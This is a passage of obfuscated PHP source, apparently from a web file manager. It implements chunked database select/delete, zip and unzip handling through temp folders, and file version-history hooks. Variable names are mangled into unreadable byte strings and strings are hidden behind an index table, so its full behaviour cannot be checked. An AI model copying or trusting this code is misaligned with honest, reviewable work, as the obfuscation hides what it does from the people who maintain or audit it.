$æ¨ìÓ÷ú[10])) { $ÖĞ¸Ãå˜ = $æ¨ìÓ÷ú[464] . $ÖĞ¸Ãå˜ . $æ¨ìÓ÷ú[464]; } $³Ÿ²•í˜ = $æ¨ìÓ÷ú[223] . $¶Ü½é» . $æ¨ìÓ÷ú[223]; $¶Ü½é» = str_replace(array($æ¨ìÓ÷ú[10], $æ¨ìÓ÷ú[465], $æ¨ìÓ÷ú[11]), $æ¨ìÓ÷ú[466], $¶Ü½é»); if ($ê¨¹ò«[$æ¨ìÓ÷ú[467]]) { $³Ÿ²•í˜ = $æ¨ìÓ÷ú[468] . $¶Ü½é» . $æ¨ìÓ÷ú[469]; if ($ê¨¹ò«[$æ¨ìÓ÷ú[470]]) { $³Ÿ²•í˜ = $æ¨ìÓ÷ú[469] . $¶Ü½é» . $æ¨ìÓ÷ú[468]; } } $ß§÷¥‹[$ƒ»‚øş] = $æ¨ìÓ÷ú[471] . $ÖĞ¸Ãå˜ . $æ¨ìÓ÷ú[472] . $³Ÿ²•í˜ . $æ¨ìÓ÷ú[473]; $ƒ»‚øş++; continue; } if (is_array($‚Çßêòû)) { $–¤•Üç¨ = is_string($ë×¾ÛÕ¼) ? $ë×¾ÛÕ¼ : $–¤•Üç¨; $‚Çßêòû = $this->parseWhereLike($‚Çßêòû, $–¤•Üç¨, !0, $¤óúç·); } if (is_numeric($ë×¾ÛÕ¼)) { $ß§÷¥‹[$ƒ»‚øş] = $‚Çßêòû; $ƒ»‚øş++; } else { $ß§÷¥‹[$ë×¾ÛÕ¼] = $‚Çßêòû; } } if ($¤óúç· && !$î¡Ò¤ğ¤) { } return $ß§÷¥‹; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($óƒé¦ş = array()) { $Î‚é†¬» =& $_SERVER[«òÑğ]; $‹Ä–®Ÿ = self::SQL_WHERE_IN_CHUNK; $÷¡şøŠ´ = $this->optionsValue(); $é¢ÃÖÍü = $this->findWhereField($÷¡şøŠ´); if (!$é¢ÃÖÍü || isset($÷¡şøŠ´[$Î‚é†¬»[370]]) || isset($÷¡şøŠ´[$Î‚é†¬»[431]])) { return parent::select($óƒé¦ş); } $ÓÀâÆ à = $÷¡şøŠ´[$Î‚é†¬»[355]][$é¢ÃÖÍü][1]; $ÓÀâÆ à = is_array($ÓÀâÆ à) ? $ÓÀâÆ à : array(); $òªµÄ° = null; for ($¹† ªâÛ = 0; $¹† ªâÛ < count($ÓÀâÆ à); $¹† ªâÛ += $‹Ä–®Ÿ) { $üœëÙ°è = array_slice($ÓÀâÆ à, $¹† ªâÛ, $‹Ä–®Ÿ); if (!is_array($üœëÙ°è) || count($üœëÙ°è) == 0) { break; } $÷¡şøŠ´[$Î‚é†¬»[355]][$é¢ÃÖÍü][1] = $üœëÙ°è; $this->optionsValue($÷¡şøŠ´); $Š×’ÒĞ = parent::select($óƒé¦ş); if (!$Š×’ÒĞ) { continue; } $òªµÄ° = is_array($òªµÄ°) ? $òªµÄ° : array(); $òªµÄ° = array_merge($òªµÄ°, $Š×’ÒĞ); } return $òªµÄ°; } public function delete($Áº¨‡‡ = array()) { $´¸ø²ä§ =& $_SERVER[«òÑğ]; $ğñ½‘Óã = self::SQL_WHERE_IN_CHUNK; $ãÄ÷Å¯† = $this->optionsValue(); $Õ¾é°İô = $this->findWhereField($ãÄ÷Å¯†); if (!$Õ¾é°İô) { return parent::delete($Áº¨‡‡); } $¶è¼ÃËÁ = 0; $ â‹ú†† = $ãÄ÷Å¯†[$´¸ø²ä§[355]][$Õ¾é°İô][1]; $ â‹ú†† = is_array($ â‹ú††) ? $ â‹ú†† : array(); for ($­è´±« = 0; $­è´±« < count($ â‹ú††); $­è´±« += $ğñ½‘Óã) { $—§Ç Õš = array_slice($ â‹ú††, $­è´±«, $ğñ½‘Óã); if (!is_array($—§Ç Õš) || count($—§Ç Õš) == 0) { break; } $ãÄ÷Å¯†[$´¸ø²ä§[355]][$Õ¾é°İô][1] = $—§Ç Õš; $this->optionsValue($ãÄ÷Å¯†); $¶è¼ÃËÁ += parent::delete($Áº¨‡‡); } return $¶è¼ÃËÁ; } private function findWhereField($®ÈßÁœß) { $½ãÒ‰µ’ =& $_SERVER[«òÑğ]; $À€£† = self::SQL_WHERE_IN_CHUNK; if (!is_array($®ÈßÁœß) || !is_array($®ÈßÁœß[$½ãÒ‰µ’[355]])) { return !1; } foreach ($®ÈßÁœß[$½ãÒ‰µ’[355]] as $­Öã¬³‘ => $ö¾Û¿Ç™) { if (is_array($ö¾Û¿Ç™) && isset($ö¾Û¿Ç™[0]) && is_string($ö¾Û¿Ç™[0]) && strtolower($ö¾Û¿Ç™[0]) == $½ãÒ‰µ’[7] && is_array($ö¾Û¿Ç™[1]) && count($ö¾Û¿Ç™[1]) > $À€£†) { ignore_timeout(); return $­Öã¬³‘; } } return !1; } public function setMasterDB($ÌÜß‚ş— = true) { think_config($_SERVER[«òÑğ][474], $ÌÜß‚ş—); } } goto CÓàÀìÌé”; eŸ±½”³ò: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $˜Í©¶–; if ($˜Í©¶–) { return $˜Í©¶–; } $ºü˜Şè‘ = IO::init($_SERVER[«òÑğ][8]); return $ºü˜Şè‘; } private static function iconvSystem($ÉüÊÉğğ) { return self::local()->iconvSystem($ÉüÊÉğğ); } private static function iconvApp($Ê¨àÁê‹) { return self::local()->iconvApp($Ê¨àÁê‹); } public static function zipFolder($÷›˜°¯¤, $™ê°¶¿Õ = "\x7a\151\x70", $¹»ë›ôî = '', $Ö–©»£ = REPEAT_RENAME) { $¹º«ûüÊ =& $_SERVER[«òÑğ]; $×ÒÑ¨·× = IO::listPath($÷›˜°¯¤); if (!$×ÒÑ¨·×) { return !1; } $×ÒÑ¨·× = array_merge($×ÒÑ¨·×[$¹º«ûüÊ[85]], $×ÒÑ¨·×[$¹º«ûüÊ[86]]); return self::zip($×ÒÑ¨·×, $™ê°¶¿Õ, $¹»ë›ôî, $Ö–©»£); } public static function zip($ÓÁ÷úÏû, $†Ìƒˆûü = "\x7a\151\x70", $²÷ê½ = '', $ÌŠĞÍ€ = REPEAT_RENAME) { $û˜ïº¤ =& $_SERVER[«òÑğ]; if (is_string($ÓÁ÷úÏû) && $ÓÁ÷úÏû) { $ÓÁ÷úÏû = array(array($û˜ïº¤[87] => $ÓÁ÷úÏû)); } $ ÜèÒ”• = self::init($ÓÁ÷úÏû[0][$û˜ïº¤[87]]); $ìà¯§°â = self::info($ÓÁ÷úÏû[0][$û˜ïº¤[87]]); $Ê—šò©õ = $û˜ïº¤[12]; $ŒúÎ¨Íç = $û˜ïº¤[12]; $ë¸ƒÊŸì = $û˜ïº¤[12]; if ($²÷ê½ && substr($²÷ê½, -1, 1) != $û˜ïº¤[8]) { $ŒúÎ¨Íç = get_path_father($²÷ê½); $ë¸ƒÊŸì = get_path_this($²÷ê½); } else { $ŒúÎ¨Íç = self::pathFather($ìà¯§°â[$û˜ïº¤[87]]); $ë¸ƒÊŸì = $ìà¯§°â[$û˜ïº¤[32]] . $û˜ïº¤[10] . $†Ìƒˆûü; if (count($ÓÁ÷úÏû) > 1) { $¾¥ÃõòÌ = IO::info($ŒúÎ¨Íç); $ë¸ƒÊŸì = $¾¥ÃõòÌ[$û˜ïº¤[32]] . $û˜ïº¤[10] . $†Ìƒˆûü; } if ($²÷ê½) { $ŒúÎ¨Íç = $²÷ê½; } } if ($ ÜèÒ”•->getType() == $û˜ïº¤[109]) { $€Ú¾¶‘ = self::init($ŒúÎ¨Íç); $Ÿàª¯Â· = $€Ú¾¶‘->getType() == $û˜ïº¤[109] ? $ŒúÎ¨Íç : get_path_father($ ÜèÒ”•->path); $Ÿàª¯Â· = IO::getPathInner($Ÿàª¯Â·); $Ÿàª¯Â· = rtrim($Ÿàª¯Â·, $û˜ïº¤[8]) . $û˜ïº¤[8]; mk_dir($Ÿàª¯Â·); } else { $Ê—šò©õ = TEMP_FILES . $û˜ïº¤[1275] . time() . rand_string(8) . $û˜ïº¤[8]; mk_dir($Ê—šò©õ); file_put_contents($Ê—šò©õ . $û˜ïº¤[1276], $û˜ïº¤[12]); $Ÿàª¯Â· = $Ê—šò©õ; } $·±Æõ›Ê = IO::info($Ÿàª¯Â·); if (!$·±Æõ›Ê || !$·±Æõ›Ê[$û˜ïº¤[236]]) { show_json(LNG($û˜ïº¤[1277]), !1); } $öÄ½«‹¨ = self::zipFileList($ÓÁ÷úÏû, $Ê—šò©õ); foreach ($öÄ½«‹¨ as $İ¦İå—Ï => $ğıûÀ†») { $öÄ½«‹¨[$İ¦İå—Ï] = self::iconvSystem($ğıûÀ†»); } $¸ôùşÉ² = get_filename_auto($Ÿàª¯Â· . $ë¸ƒÊŸì, $û˜ïº¤[12], $ÌŠĞÍ€); KodArchive::create(self::iconvSystem($¸ôùşÉ²), $öÄ½«‹¨); if (!IO::exist($¸ôùşÉ²)) { if ($Ê—šò©õ) { del_dir($Ê—šò©õ); } write_log($û˜ïº¤[1278] . $¸ôùşÉ², $û˜ïº¤[391]); show_json(LNG($û˜ïº¤[1279]), !1); } if (!$Ê—šò©õ) { return $¸ôùşÉ²; } $åéı³šÀ = self::move($¸ôùşÉ², $ŒúÎ¨Íç, $ÌŠĞÍ€); if ($Ê—šò©õ) { del_dir($Ê—šò©õ); } if (!$¸ôùşÉ²) { write_log($û˜ïº¤[1280] . $¸ôùşÉ² . $û˜ïº¤[1281] . $ŒúÎ¨Íç, $û˜ïº¤[391]); show_json(LNG($û˜ïº¤[1279]), !1); } return $åéı³šÀ; } public static function unzip($¿¬™ÅÂ¿, $™´õ…, $‹Âå–Œ = "\55\x31", $ğŒ’¼úŠ = "\162\x65\160\154\141\143\x65") { $í¬»¥÷ø =& $_SERVER[«òÑğ]; $–íşÖÓÔ = parent::info($¿¬™ÅÂ¿); if (!$–íşÖÓÔ) { show_json(LNG($í¬»¥÷ø[1282]), !1); } $—ã€´Š¯ = IO::infoFullSimple($™´õ…); if (!$—ã€´Š¯) { $™´õ… = IO::mkdir($™´õ…); } if (isset($—ã€´Š¯[$í¬»¥÷ø[194]]) && trim($—ã€´Š¯[$í¬»¥÷ø[87]], $í¬»¥÷ø[8]) != trim($™´õ…, $í¬»¥÷ø[8])) { $áı»Ğ‘  = KodIO::make($—ã€´Š¯[$í¬»¥÷ø[193]]); $ä¤¥ëË = IO::fileNameAuto($áı»Ğ‘ , $—ã€´Š¯[$í¬»¥÷ø[32]], REPEAT_RENAME_FOLDER, !0); $™´õ… = IO::mkdir($áı»Ğ‘  . $ä¤¥ëË); } $‹Âå–Œ = $‹Âå–Œ && $‹Âå–Œ != $í¬»¥÷ø[1283] ? @json_decode($‹Âå–Œ, !0) : -1; $”øÊÜà® = self::unzipPart($¿¬™ÅÂ¿, $‹Âå–Œ); if (!$”øÊÜà® || !IO::exist($”øÊÜà®[$í¬»¥÷ø[233]])) { show_json(LNG($í¬»¥÷ø[108]), !1); } $Ğ²áŞ· = $”øÊÜà®[$í¬»¥÷ø[1284]][count($”øÊÜà®[$í¬»¥÷ø[1284]]) - 1]; if ($Ğ²áŞ·[$í¬»¥÷ø[1285]] == -1 || substr($Ğ²áŞ·[$í¬»¥÷ø[32]], -1, 1) == $í¬»¥÷ø[8]) { $šæßºÍ› = $”øÊÜà®[$í¬»¥÷ø[1286]] . rand_string(10) . $í¬»¥÷ø[8]; mk_dir($šæßºÍ›); $è‚áğé— = count($”øÊÜà®[$í¬»¥÷ø[1284]]) == 1 ? IO::ext($¿¬™ÅÂ¿) : get_path_ext($”øÊÜà®[$í¬»¥÷ø[233]]); $îò¼÷Ô‹ = KodArchive::extract(self::iconvSystem($”øÊÜà®[$í¬»¥÷ø[233]]), $šæßºÍ›, $Ğ²áŞ·[$í¬»¥÷ø[1285]], $ä¤¥ëË, $è‚áğé—); self::unzipErrorCheck($îò¼÷Ô‹, array($í¬»¥÷ø[1287], $¿¬™ÅÂ¿, $è‚áğé—, $™´õ…, $”øÊÜà®)); Hook::trigger($í¬»¥÷ø[1288], $šæßºÍ›); recursion_dir($šæßºÍ›, $»„¶š¢, $¾ñŒÜªÛ, 0); $ø®°Ü« = array_merge($»„¶š¢, $¾ñŒÜªÛ); $ñ¾¯†½´ = array(); foreach ($ø®°Ü« as $ùëÔ¿ø­) { $˜‘¼îñ• = IO::move(self::iconvApp($ùëÔ¿ø­), $™´õ…, $ğŒ’¼úŠ); if ($˜‘¼îñ•) { $ñ¾¯†½´[] = $˜‘¼îñ•; } } del_dir($šæßºÍ›); } else { $˜‘¼îñ• = IO::move($”øÊÜà®[$í¬»¥÷ø[233]], $™´õ…, $ğŒ’¼úŠ, get_path_this($Ğ²áŞ·[$í¬»¥÷ø[32]])); if ($˜‘¼îñ•) { $ñ¾¯†½´[] = $˜‘¼îñ•; } } return $ñ¾¯†½´ ? $ñ¾¯†½´ : !1; } public static function unzipList($¾Ë˜È­ï) { $Ï±ª =& $_SERVER[«òÑğ]; $ŞøÅ¡– = isset($¾Ë˜È­ï[$Ï±ª[1289]]) ? $¾Ë˜È­ï[$Ï±ª[1289]] : !1; $»âŒ¥¶ = isset($¾Ë˜È­ï[$Ï±ª[1285]]) ? @json_decode($¾Ë˜È­ï[$Ï±ª[1285]], !0) : -1; $«¶«Ëõå = self::unzipPart($¾Ë˜È­ï[$Ï±ª[87]], $»âŒ¥¶); if (!$«¶«Ëõå || !IO::exist($«¶«Ëõå[$Ï±ª[233]])) { show_json(LNG($Ï±ª[108]), !1); } $üû™‡ıò = $«¶«Ëõå[$Ï±ª[1284]][count($«¶«Ëõå[$Ï±ª[1284]]) - 1]; $ŠÄÔâå˜ = in_array(IO::ext($«¶«Ëõå[$Ï±ª[233]]), array($Ï±ª[391], $Ï±ª[1290], $Ï±ª[1291], $Ï±ª[1292], $Ï±ª[1293], $Ï±ª[1294])); if (!$ŞøÅ¡– && ($üû™‡ıò[$Ï±ª[1285]] == -1 || $ŠÄÔâå˜)) { $İÇ¯ÔˆŠ = $«¶«Ëõå[$Ï±ª[1286]] . get_path_this($«¶«Ëõå[$Ï±ª[233]]) . $Ï±ª[1295]; if (!IO::exist($İÇ¯ÔˆŠ)) { $ù“¤½øÅ = $üû™‡ıò[$Ï±ª[1285]] == -1 ? get_path_ext(IO::pathThis($¾Ë˜È­ï[$Ï±ª[87]])) : get_path_ext($«¶«Ëõå[$Ï±ª[233]]); $ã®ïı®‡ = KodArchive::listContent(self::iconvSystem($«¶«Ëõå[$Ï±ª[233]]), !0, $ù“¤½øÅ); self::unzipErrorCheck($ã®ïı®‡, array($Ï±ª[1296], $¾Ë˜È­ï, $«¶«Ëõå)); @file_put_contents($İÇ¯ÔˆŠ, json_encode($ã®ïı®‡[$Ï±ª[1297]])); } return @json_decode(IO::getContent($İÇ¯ÔˆŠ), !0); } IO::fileOut($«¶«Ëõå[$Ï±ª[233]], $ŞøÅ¡–, get_path_this($üû™‡ıò[$Ï±ª[32]])); die; } private static function zipFileList($âÍàô, $ì²Æ¡ùì = false) { $ÙÎ‹Ö÷ä =& $_SERVER[«òÑğ]; $Û·±™·š = array(); foreach ($âÍàô as $¤‚şâ„) { $©Ûô–ôÅ = $¤‚şâ„[$ÙÎ‹Ö÷ä[87]]; if ($ì²Æ¡ùì) { $©Ûô–ôÅ = self::copy($¤‚şâ„[$ÙÎ‹Ö÷ä[87]], $ì²Æ¡ùì, $ÙÎ‹Ö÷ä[908]); } else { $»€±ÀÏ = self::init($¤‚şâ„[$ÙÎ‹Ö÷ä[87]]); if ($»€±ÀÏ->getType() == $ÙÎ‹Ö÷ä[109]) { $©Ûô–ôÅ = $»€±ÀÏ->path; } } if ($©Ûô–ôÅ && self::local()->exist($©Ûô–ôÅ)) { $Û·±™·š[$¤‚şâ„[$ÙÎ‹Ö÷ä[87]]] = $©Ûô–ôÅ; } } if (!empty($Û·±™·š)) { return array_values($Û·±™·š); } show_json(LNG($ÙÎ‹Ö÷ä[1256]), !1); } private static function localFilePath($Ö¶“»¥Ö) { $õŒÖì‚Ú =& $_SERVER[«òÑğ]; $í¬œ»¿š = KodIO::parse($Ö¶“»¥Ö); if ($í¬œ»¿š[$õŒÖì‚Ú[33]] == KodIO::KOD_SOURCE) { $®£åÎãû = Model($õŒÖì‚Ú[914])->fileInfoGet(KodIO::sourceID($Ö¶“»¥Ö)); if (!$®£åÎãû[$õŒÖì‚Ú[87]]) { show_json($õŒÖì‚Ú[1298], !1); } $Ö¶“»¥Ö = $®£åÎãû[$õŒÖì‚Ú[87]]; } $º½ëĞû— = self::init($Ö¶“»¥Ö); if ($º½ëĞû—->pathParse[$õŒÖì‚Ú[1242]]) { $Ö¶“»¥Ö = $º½ëĞû—->pathParse[$õŒÖì‚Ú[1242]]; $º½ëĞû— = self::init($Ö¶“»¥Ö); } $µÎÕïà = $º½ëĞû—->getType(); if ($µÎÕïà == $õŒÖì‚Ú[109] || $µÎÕïà == $õŒÖì‚Ú[1299]) { if (!$º½ëĞû—->exist($º½ëĞû—->path)) { show_json(LNG($õŒÖì‚Ú[108]), !1); } return $º½ëĞû—->path; } return !1; } public static function unzipPart($âÑ‰­Õ, $Û°œº®­ = -1) { $¬íŸéå“ =& $_SERVER[«òÑğ]; $ÅğÜş‹± = IO::pathThis($âÑ‰­Õ); if (!$Û°œº®­ || $Û°œº®­ == -1) { $õÅı§™© = array(array($¬íŸéå“[32] => $ÅğÜş‹±, $¬íŸéå“[1285] => -1)); $õÅı§™©[0][$¬íŸéå“[1300]] = $õÅı§™©[0][$¬íŸéå“[32]]; } else { if (is_array($Û°œº®­)) { $õÅı§™© = $Û°œº®­; $ÔâÒ˜‰Ş = count($õÅı§™©) - 1; for ($²ìàè¾ = 0; $²ìàè¾ <= $ÔâÒ˜‰Ş; $²ìàè¾++) { $üÅÉ—Ã = $õÅı§™©[$²ìàè¾]; $ãİû™ï = get_path_this($üÅÉ—Ã[$¬íŸéå“[32]]) . (checkExtSafe($üÅÉ—Ã[$¬íŸéå“[32]]) ? $¬íŸéå“[12] : $¬íŸéå“[1301]); $õÅı§™©[$²ìàè¾][$¬íŸéå“[1300]] = $¬íŸéå“[1302] . intval($üÅÉ—Ã[$¬íŸéå“[1285]]) . $¬íŸéå“[465] . $ãİû™ï; if ($²ìàè¾ == 0) { continue; } $õÅı§™©[$²ìàè¾][$¬íŸéå“[1300]] = $õÅı§™©[$²ìàè¾ - 1][$¬íŸéå“[1300]] . $¬íŸéå“[1303] . $õÅı§™©[$²ìàè¾][$¬íŸéå“[1300]]; } } } if (!is_array($õÅı§™©) || count($õÅı§™©) == 0) { return !1; } $´‡¸˜¡ = $õÅı§™©[count($õÅı§™©) - 1]; if (!IO::exist($âÑ‰­Õ)) { return !1; } $š¤¾Ùãò = TEMP_FILES . $¬íŸéå“[1304] . kodIO::hashPathSafe($âÑ‰­Õ) . $¬íŸéå“[8]; $Ñ³”†ÇÈ = $š¤¾Ùãò . $´‡¸˜¡[$¬íŸéå“[1300]]; mk_dir($š¤¾Ùãò); file_put_contents(TEMP_FILES . $¬íŸéå“[1276], $¬íŸéå“[12]); if (IO::exist($Ñ³”†ÇÈ)) { return array($¬íŸéå“[233] => $Ñ³”†ÇÈ, $¬íŸéå“[1284] => $õÅı§™©, $¬íŸéå“[1286] => $š¤¾Ùãò); } $ûÇ¦ùÚÊ = self::localFilePath($âÑ‰­Õ); if (!$ûÇ¦ùÚÊ) { $ûÇ¦ùÚÊ = $š¤¾Ùãò . $¬íŸéå“[1305]; if (!IO::exist($ûÇ¦ùÚÊ)) { self::copy($âÑ‰­Õ, $š¤¾Ùãò, !1, get_path_this($ûÇ¦ùÚÊ)); } } if (!$ûÇ¦ùÚÊ || !IO::exist($ûÇ¦ùÚÊ)) { return !1; } if ($´‡¸˜¡[$¬íŸéå“[1285]] == -1) { return array($¬íŸéå“[233] => $ûÇ¦ùÚÊ, $¬íŸéå“[1284] => $õÅı§™©, $¬íŸéå“[1286] => $š¤¾Ùãò); } $™¯Üıù‹ = $ûÇ¦ùÚÊ; foreach ($õÅı§™© as $²ìàè¾ => $üÅÉ—Ã) { if (!$üÅÉ—Ã || $üÅÉ—Ã[$¬íŸéå“[1285]] == $¬íŸéå“[1283]) { break; } if (substr($üÅÉ—Ã[$¬íŸéå“[32]], -1, 1) == $¬íŸéå“[8]) { break; } $å·ÁÑÓ¸ = in_array(get_path_ext($üÅÉ—Ã[$¬íŸéå“[1300]]), array($¬íŸéå“[391], $¬íŸéå“[1290], $¬íŸéå“[1291], $¬íŸéå“[1292], $¬íŸéå“[1293], $¬íŸéå“[1294])); $¡Í¨â‡Ñ = $²ìàè¾ == count($õÅı§™©) - 1 && $å·ÁÑÓ¸; $™Ğº¾™š = $š¤¾Ùãò . $üÅÉ—Ã[$¬íŸéå“[1300]]; $ĞŠ‹›ô„ = $š¤¾Ùãò . get_path_this($üÅÉ—Ã[$¬íŸéå“[32]]); if (IO::exist($™Ğº¾™š)) { $™¯Üıù‹ = $™Ğº¾™š; continue; } $äÅ˜Äª® = $²ìàè¾ == 0 ? get_path_ext($ÅğÜş‹±) : get_path_ext($™¯Üıù‹); $¼×¾Õã… = KodArchive::extract(self::iconvSystem($™¯Üıù‹), $š¤¾Ùãò, $üÅÉ—Ã[$¬íŸéå“[1285]], $èË®ªì», $äÅ˜Äª®); self::unzipErrorCheck($¼×¾Õã…, array($¬íŸéå“[1306], $âÑ‰­Õ, $õÅı§™©, $üÅÉ—Ã, $™Ğº¾™š)); if (IO::exist($ĞŠ‹›ô„)) { IO::rename($ĞŠ‹›ô„, get_path_this($™Ğº¾™š)); } $™¯Üıù‹ = $™Ğº¾™š; } $Ñ³”†ÇÈ = $™¯Üıù‹; return array($¬íŸéå“[233] => $™¯Üıù‹, $¬íŸéå“[1284] => $õÅı§™©, $¬íŸéå“[1286] => $š¤¾Ùãò); } private static function unzipErrorCheck($öûî½…“, $ø¼­¢Ö = false) { $èì¼‡ ş =& $_SERVER[«òÑğ]; if ($öûî½…“[$èì¼‡ ş[1307]]) { return !0; } write_log(array($èì¼‡ ş[1308], $öûî½…“, $ø¼­¢Ö), $èì¼‡ ş[1309]); $ˆûÂñÄè = is_array($öûî½…“[$èì¼‡ ş[1297]]) ? json_encode($öûî½…“[$èì¼‡ ş[1297]]) : $öûî½…“[$èì¼‡ ş[1297]]; show_json($èì¼‡ ş[1310] . $ˆûÂñÄè, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¸º‡€Â³ =& $_SERVER[«òÑğ]; $–ú½ô’Á = $GLOBALS[$¸º‡€Â³[6]][$¸º‡€Â³[92]]; if ($–ú½ô’Á[$¸º‡€Â³[1311]] != 1) { return; } if ($–ú½ô’Á[$¸º‡€Â³[1312]] <= 0) { return; } if (isset($_REQUEST[$¸º‡€Â³[1313]]) && $_REQUEST[$¸º‡€Â³[1313]] == $¸º‡€Â³[91]) { return; } Hook::bind($¸º‡€Â³[1314], $¸º‡€Â³[1315]); Hook::bind($¸º‡€Â³[1316], $¸º‡€Â³[1317]); Hook::bind($¸º‡€Â³[1318], $¸º‡€Â³[1319]); Hook::bind($¸º‡€Â³[1320], $¸º‡€Â³[1321]); Hook::bind($¸º‡€Â³[1322], $¸º‡€Â³[1323]); Hook::bind($¸º‡€Â³[1324], $¸º‡€Â³[1325]); } public static function eventBeforeUpload($°ª¬º¶Ÿ) { if ($°ª¬º¶Ÿ[3] && $°ª¬º¶Ÿ[3] != REPEAT_REPLACE) { return; } $â‡£ğÈª = self::parsePath($°ª¬º¶Ÿ[0]); if (!$â‡£ğÈª) { return; } self::add($â‡£ğÈª); } public static function eventBeforeEdit($ƒ‰ıéî) { $…é„ÈÁ´ = self::parsePath($ƒ‰ıéî[0]); if (!$…é„ÈÁ´) { return; } self::add($…é„ÈÁ´); } public static function eventBeforeCopyFile($¿˜–‰Ìğ, $Ÿ’¹…ı, $ÖŒ²™¿º, $ĞıÚÅ½æ, $§à«ıªŞ, $ÓâÙ¿ï) { $ÇÛÆ½‚ =& $_SERVER[«òÑğ]; if (isset($ÖŒ²™¿º->_data[$ÇÛÆ½‚[1246]]) && $ÖŒ²™¿º->_data[$ÇÛÆ½‚[1246]]) { return; } $£¨Â¤§ = $ÖŒ²™¿º->getPathOuter($ĞıÚÅ½æ); $úÄ¿¬› = self::parsePath($£¨Â¤§); if (!$úÄ¿¬›) { return; } self::add($úÄ¿¬›); } public static function eventBeforeRename($æÃ‘€±ì) { $ÎÛŠÃË =& $_SERVER[«òÑğ]; $®›¼øÕÇ = self::parsePath($æÃ‘€±ì[0]); if (!$®›¼øÕÇ) { return; } $ÙñÏŞµ› = self::checkInHistory($®›¼øÕÇ); if (!$ÙñÏŞµ›) { return; } if ($ÙñÏŞµ›[$ÎÛŠÃË[33]] == $ÎÛŠÃË[233]) { $â­ÃÍ’á = self::listData($®›¼øÕÇ); if ($â­ÃÍ’á && $â­ÃÍ’á[$ÎÛŠÃË[448]]) { self::moveHistory($®›¼øÕÇ, $æÃ‘€±ì[1]); } } else { IO::rename($ÙñÏŞµ›[$ÎÛŠÃË[87]], $æÃ‘€±ì[1]); } } public static function eventBeforeMove($¥¿ì€ƒ) { $§ÙÃª©‘ =& $_SERVER[«òÑğ]; $Šûûı†À = self::parsePath($¥¿ì€ƒ[0]); if (!$Šûûı†À) { return; } $‡ÑÈ½ƒª = self::parsePath($¥¿ì€ƒ[1]); if (!$‡ÑÈ½ƒª) { return; } $œÕİäÑÍ = $¥¿ì€ƒ[3]; $»«íÀ°ı = self::checkInHistory($Šûûı†À); if (!$»«íÀ°ı) { return; } $»ğ—ºë = self::pathHistory($‡ÑÈ½ƒª); if ($»«íÀ°ı[$§ÙÃª©‘[33]] == $§ÙÃª©‘[233]) { $ÄğÊúè­ = self::listData($Šûûı†À); $ïèã±úÅ = rtrim($‡ÑÈ½ƒª, $§ÙÃª©‘[8]) . $§ÙÃª©‘[8] . ($œÕİäÑÍ ? $œÕİäÑÍ : get_path_this($Šûûı†À)); $ù—‰áÉ§ = self::listData($ïèã±úÅ); if ($ÄğÊúè­ && $ÄğÊúè­[$§ÙÃª©‘[448]] && $ù—‰áÉ§ && $ù—‰áÉ§[$§ÙÃª©‘[448]]) { return self::clear($Šûûı†À); } if ($ÄğÊúè­ && $ÄğÊúè­[$§ÙÃª©‘[448]]) { self::moveHistory($Šûûı†À, $œÕİäÑÍ, $»ğ—ºë); } } else { IO::move($»«íÀ°ı[$§ÙÃª©‘[87]], $»ğ—ºë, !1, $œÕİäÑÍ); self::clearEmptyFolder(IO::pathFather($»«íÀ°ı[$§ÙÃª©‘[87]])); } } public static function eventAfterRemove($€œÆóÊì, $îÂƒàÓş) { $§»Ãî¨Ç =& $_SERVER[«òÑğ]; if (!$îÂƒàÓş) { return; } $è¨µÎÁø = self::parsePath($€œÆóÊì[0]); if (!$è¨µÎÁø) { return; } $‘û½´­¾ = self::checkInHistory($è¨µÎÁø); if (!$‘û½´­¾) { return; } if ($‘û½´­¾[$§»Ãî¨Ç[33]] == $§»Ãî¨Ç[233]) { $İ»„ÎÕò = self::listData($è¨µÎÁø, !1); if ($İ»„ÎÕò && $İ»„ÎÕò[$§»Ãî¨Ç[448]]) { self::clear($è¨µÎÁø, !1); } } else { IO::remove($‘û½´­¾[$§»Ãî¨Ç[87]]); self::clearEmptyFolder(IO::pathFather($‘û½´­¾[$§»Ãî¨Ç[87]])); } } private static function checkInHistory($ı•ğıõ) { $›±«óÀ¯ = self::pathHistory($ı•ğıõ); if (!IO::exist($›±«óÀ¯)) { $›±«óÀ¯ .= $_SERVER[«òÑğ][1326]; } return IO::exist($›±«óÀ¯) ? IO::info($›±«óÀ¯) : !1; } private static function parsePath($ıë½‚ ») { $Ğ÷Í÷Ğò =& $_SERVER[«òÑğ]; if (!$ıë½‚ ») { return !1; } if (isset($GLOBALS[$Ğ÷Í÷Ğò[1327]]) && $GLOBALS[$Ğ÷Í÷Ğò[1327]]) { return; } $ÀôÑÎ¡ = KodIO::parse($ıë½‚ »); $÷õù€ı = $ÀôÑÎ¡[$Ğ÷Í÷Ğò[33]]; $ùˆ«Ù¦ñ = !$÷õù€ı || $÷õù€ı == KodIO::KOD_IO || $÷õù€ı == KodIO::KOD_SHARE_ITEM; if (!$ùˆ«Ù¦ñ || !$ÀôÑÎ¡[$Ğ÷Í÷Ğò[1328]]) { return !1; } if (substr($ıë½‚ », 0, strlen(DATA_PATH . $Ğ÷Í÷Ğò[1329])) == DATA_PATH . $Ğ÷Í÷Ğò[1329]) { return !1; } if ($÷õù€ı == KodIO::KOD_SHARE_ITEM) { $•¾â¤âÓ = IO::init($ıë½‚ »); if ($•¾â¤âÓ->pathParse[$Ğ÷Í÷Ğò[1242]]) { return self::parsePath($•¾â¤âÓ->pathParse[$Ğ÷Í÷Ğò[1242]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‰íÜíç¾ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ğ÷Í÷Ğò[1330]); foreach ($‰íÜíç¾ as $§ƒèåÁ) { if (!$÷õù€ı && substr($ıë½‚ », 0, strlen($§ƒèåÁ)) == $§ƒèåÁ) { return !1; } } self::log($GLOBALS[$Ğ÷Í÷Ğò[1237]] . $Ğ÷Í÷Ğò[1331] . $ıë½‚ »); return $ıë½‚ »; } private static function pathHistory($ æ³âÈ) { $‡öœÚÉú =& $_SERVER[«òÑğ]; $³ı´–í¨ = self::$_historyBase . ltrim(KodIO::clear($ æ³âÈ), $‡öœÚÉú[8]); $³ı´–í¨ = 